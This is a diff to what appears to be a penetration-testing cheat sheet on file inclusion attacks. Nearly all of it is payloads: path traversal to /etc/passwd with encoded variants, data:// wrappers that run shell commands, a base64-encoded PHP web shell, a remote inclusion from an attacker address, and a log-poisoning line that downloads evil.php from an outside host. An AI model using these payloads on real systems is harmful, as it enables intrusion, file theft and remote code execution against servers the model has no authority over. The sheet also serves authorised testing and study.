@@ -2,7 +2,8 @@
 
 ### LFI Filter Bypass
 
-```
+{% code overflow="wrap" %}
+```bash
 # For site that append .php to the end of the url:
 http://[URL]/?page=../../../../../../../etc/passwd&ext=
 
@@ -22,22 +23,23 @@ http://[URL]/?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%
 
 # Data filter
 /menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id    # <?php system($_GET["cmd"]); ?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id 
+# <?php system($_GET["cmd"]); ?>
 
 # If site return error code on fail, use ffuf or burp intruder
-
 c:\boot.ini for windows
 ```
+{% endcode %}
 
 ### RFI
 
-```
+```bash
 file=http://10.11.0.4/evil.txt
 ```
 
 ### LFI to RCE - Log Poisoning
 
-```
+```php
 # Modify user agent
 # Read /var/log/apache2/access.log
 <?php file_put_contents('evil.php', file_get_contents('http://[IP_ADDR]/evil.php'))?>
